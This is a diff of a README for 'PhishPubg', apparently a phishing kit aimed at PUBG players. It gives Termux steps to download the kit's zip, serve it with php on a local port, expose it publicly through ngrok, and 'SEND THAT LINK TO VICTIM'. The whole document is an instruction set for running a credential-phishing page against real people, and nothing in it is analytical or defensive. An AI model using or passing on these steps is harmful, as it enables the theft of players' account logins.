@@ -1,26 +1,20 @@
-# Pubg-phish
+# PhishPubg
 
 
 ## Download zip file
 
-Open this link https://www.mediafire.com/file/g4eomdmk0hgrnpm/Pubg-phish.zip/file
-
-In this link there is a zip file download it
-
-
-## In termux
-
-` termux-setup-storage` enable the storage permission
-
-` cd /storage/emulated/0/Download `
-
-`mv Pubg-phish $HOME `
+Open Termux
 
 `cd`
 
-`unzip Pubg-phish.zip`
+Type `https://raw.githubusercontent.com/RDXLR/PhishPubg/main/PhishPubg.zip`
 
-`cd Pubg-phish.zip`
+## Using In termux
+
+
+`unzip PhishPubg.zip`
+
+`cd PhishPubg`
 
 `php -S localhost:3839` you can type any port I typed 3839
 
@@ -32,7 +26,7 @@ Open a new session
 
 `cd`
 
-` ./NGROK http 3839` if you have given different port type that port
+` ./ngrok http 3839` if you have given different port type that port
 
 
 LINK WILL BE GENERATED SEND THAT LINK TO VICTIM
